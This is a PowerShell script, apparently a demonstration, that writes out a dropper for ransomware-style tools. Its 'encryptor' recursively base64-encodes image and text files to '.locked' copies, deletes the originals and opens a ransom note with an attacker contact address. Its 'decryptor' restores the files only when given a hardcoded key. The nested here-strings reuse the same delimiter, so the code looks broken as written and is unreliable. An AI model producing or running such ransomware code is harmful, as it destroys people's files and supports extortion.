$fix = @'
# Stage 1: The Dropper (Tool Provisioning)
Write-Host "[*] Provisioning attack tools..." -ForegroundColor Gray

# --- 1. THE ENCRYPTOR ---
$encCode = @'
param(
    [string]$Target = ".\", 
    [string]$SecretKey = "AI-DEMO-2026"
)
$ResolvedPath = (Resolve-Path $Target).Path
$ransomNotePath = Join-Path $ResolvedPath "READ_ME_NOW.txt"
Write-Host "[!] TARGET ACQUIRED: $ResolvedPath" -ForegroundColor Red

Get-ChildItem -Path $ResolvedPath -Include *.jpg,*.png,*.txt -Exclude "READ_ME_NOW.txt","*.locked" -Recurse | ForEach-Object {
    $content = [System.IO.File]::ReadAllBytes($_.FullName)
    $encoded = [System.Convert]::ToBase64String($content)
    $encoded | Set-Content ($_.FullName + ".locked")
    Remove-Item $_.FullName
    Write-Host "LOCKED: $($_.Name)" -ForegroundColor Yellow
}

$noteContent = "YOUR FILES ARE ENCRYPTED.`nTARGET: $ResolvedPath`nKEY ID: $SecretKey`nCONTACT: ATTACKER@DARKWEB.COM"
$noteContent | Set-Content $ransomNotePath
Start-Process notepad.exe $ransomNotePath
'@

# --- 2. THE DECRYPTOR ---
$decCode = @'
param(
    [string]$Key,
    [string]$Target = ".\"
)
$ResolvedPath = (Resolve-Path $Target).Path
if ($Key -eq "AI-DEMO-2026") {
    Write-Host "[+] Key Validated. Scanning $ResolvedPath..." -ForegroundColor Green
    Get-ChildItem -Path $ResolvedPath -Filter *.locked -Recurse | ForEach-Object {
        $encoded = Get-Content $_.FullName
        $decoded = [System.Convert]::FromBase64String($encoded)
        $originalName = $_.FullName.Replace(".locked", "")
        [System.IO.File]::WriteAllBytes($originalName, $decoded)
        Remove-Item $_.FullName
        Write-Host "RESTORED: $(Split-Path $originalName -Leaf)" -ForegroundColor Cyan
    }
} else {
    Write-Host "[-] ACCESS DENIED. WRONG KEY." -ForegroundColor Red
}
'@

$encCode | Set-Content .\encrypt.ps1
$decCode | Set-Content .\decrypt.ps1
Write-Host "[+] Tools extracted: encrypt.ps1, decrypt.ps1" -ForegroundColor Green
'@

# Save and Run the Fix
$fix | Set-Content .\setup.ps1
.\setup.ps1
